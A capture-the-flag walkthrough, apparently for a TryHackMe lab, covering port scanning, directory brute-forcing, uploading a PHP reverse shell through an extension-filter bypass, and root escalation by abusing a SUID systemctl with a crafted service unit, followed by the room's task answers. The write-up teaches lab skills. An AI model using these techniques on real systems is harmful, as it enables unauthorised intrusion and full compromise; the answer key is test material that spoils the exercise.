Hi!

Let's start!

1. To begin with, we must classically connect to a VPN using OpenVPN.
Go to your [profile](https://tryhackme.com/access), download the file to connect, go to "/Downloads" and create the new
terminal:

```$ openvpn <Name>.ovpn ```

2. After that, we open the quest no. 1 and launch the instance (Deploy).

3. After all this, we can slowly start. The first thing we do is scan the machine:

```$ nmap -sC -sV -T4 -A <IpAdress>```

4. Scanning show us  the [Apache server](https://en.wikipedia.org/wiki/Apache_HTTP_Server) is running on port "3333". So we type in your browser
Address: Ip: 3333 and we look at what's on it.

5. Now, due to the fact that searching manually for paths on the page can be very monotonous and ineffective, we will use [dirb](https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86),
[dirbuster](https://ourcodeworld.com/articles/read/417/how-to-list-directories-and-files-of-a-website-using-dirbuster-in-kali-linux), [wfuzz](https://wfuzz.readthedocs.io/en/latest/user/basicusage.html), [gobuster](https://tools.kali.org/web-applications/gobuster). Depending on what is more convenient for you. I will use a gobuster:

```$ gobuster dir -u http://<ip>:3333/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt```

6. After a while we find the path "/internal", so we check to see what's there. (Ip: 3333 / internal). We can see that on the site
we can send files to the server. The first thing we check is what files can be sent. Mostly cases can be omitted.

7. Since I'm on the "Kali" system, I will use PHP shell. Copy reverse-shell to your working directory:

```$ cp /usr/share/webshells/php/php-reverse-shell.php .```

8. We now need to edit the file to our Ip and Port address. The Ip address is the address that appears after "ifconfig" is entered
next to "tun0" (your ip in VPN). The port set on the "hacker" 4444. ($ ip, $ port). And let's save the file.
(I used the "nano" editor, but you can use the editor that is more convenient for you, e.g. "vi")

9. To intercept reverse shell it would be nice to listen to the port we set up. We will use [NetCat](https://en.wikipedia.org/wiki/Netcat) for this:

```$ nc -nlvp 4444``` (<--port)

10. You can make copies of this file to different ".html" ".php" ".php1" ".php2" ".php5" ".phtml" paths. I checked
trying to upload files manually, but you can use for example "BurpSuite".

11. After checking, the server managed to send the file with the extension ".phtml". So we check where the file was uploaded to
to do this, add "/ uploads" to the path and see reverse file.

12. We click on the file on the server (in the browser) and in the terminal where we started netcat we see the connection and can start issuing commands.

13. Typing for example "id" "whoami" we can see our permissions.

14. At this point, we need to see what we are authorized to do when entering e.g. home:
```
$ cd /home
$ ls
$ cd bill
$ cat user.txt
```

15. The first "flag" for the user was displayed.

16. Now we are looking for SUID binaries. [SUID](https://en.wikipedia.org/wiki/Setuid) stands for the permissions of a given user to certain files:

```$ find / -user root -perm -4000 -print 2>/dev/null```

17. We now see a few files with the SUID flag set.

18. Now we need to make an attack called [Privilege Escalation](https://en.wikipedia.org/wiki/Privilege_escalation) to elevate our system privileges. By scanning
the SUID flag we found a file named [systemctl](https://www.freedesktop.org/software/systemd/man/systemctl.html).

Systemctl is a binary file that controls user interfaces and is responsible e.g. for services run during boot.
By default, systemctl will search files in "/ etc / system / systemd" in order to search and service units.

19. On this machine we cannot create new files in the paths belonging to root, but we can change the [variables environment](https://en.wikipedia.org/wiki/Environment_variable) in an already existing one, so we can do PrivEsc.

20. The first thing we do is create an environment variable:

```$ priv=$(mktemp).service```

Now we need to create a unit file and assign it to an environment variable:
```
$ echo '[Service]
ExecStart=/bin/bash -c "cat /root/root.txt > /opt/flag"
[Install] 
WantedBy=multi-user.target' > $priv
```

( Don't be afraid to use enter until the end of '<- then you can continue typing on a new line. )

21. What we just did is create a service that will execute "Bash", then read the falge from root's root directory and save it to the file / flag in the "/ opt" directory.

22. Now we need to fire the unit file with "systemctl".

```$ /bin/systemctl link $priv

$ /bin/systemctl enable --now $priv
```

23. Now we can see the flag file in the directory "/opt".

```$ cat flag```

24. That's it. We just executed the command for the root user.

// Completing the headings

Task 2.

1) 6

2) 3.5.12

3) 400

4) DNS

5) Ubuntu

6) 3333

Task 3.

1) /internal/

Task 4.

1) .php

2) .phtml

3) bill

4) YOUR USER FLAG 

Task 5.

1) /bin/systemctl

2) YOUR ROOT FLAG 
